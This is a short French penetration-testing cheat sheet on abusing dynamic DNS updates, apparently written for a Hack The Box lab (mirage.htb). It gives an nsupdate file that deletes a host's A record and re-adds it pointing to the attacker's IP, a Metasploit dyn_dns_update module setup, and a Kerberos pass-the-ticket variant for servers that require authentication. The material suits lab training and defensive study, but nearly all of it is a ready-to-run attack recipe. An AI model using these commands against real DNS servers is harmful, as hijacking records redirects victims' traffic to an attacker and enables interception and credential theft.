
> [!Tip]
> Consiste à mettre à jour les enregistrements DNS de manière dynamique au travers du service DHCP.


[[#NONSECURE]]
[[#SECURE]]

# NONSECURE

> [!TIP]
> Si paramétré, Le serveur DNS accepte l'update des enregistrement DNS de la part de n'importe qui sans authentification, autrement dit il est possible de forcer un enregistrement DNS à pointer vers une IP malicieuse. 


## NSUPDATE

Créer un fichier dnsupdate.txt contenant les informations à mettre à jour.

```
server <ip_serveur>
zone mirage.htb
update delete nats-svc.mirage.htb A  
update add nats-svc.mirage.htb 60 A <YOUR_IP>  
send
```

exécuter avec la commande nsupdate

```
nsupdate dnsupdate.txt
```

### METASPLOIT 

Module "admin/dns/dyn_dns_update"

```
use admin/dns/dyn_dns_update

set rhost <DNS_server_IP>

set domain <domain.local>

set ip <IP_attacker>

set hostname <hostname_pointant_vers_ip_attacker>

exploit
```


# SECURE

> [!Tip]
> Nécessite un ticket Kerberos pour update les enregistrements.

Pass the cache / Pass the ticket

```
export KRB5CCNAME=user.ccache
```

Créer un fichier dnsupdate.txt contenant les informations à mettre à jour.

```
server <ip_serveur>
zone mirage.htb
update delete nats-svc.mirage.htb A  
update add nats-svc.mirage.htb 60 A <YOUR_IP>  
send
```

exécuter avec la commande nsupdate

```
nsupdate dnsupdate.txt
```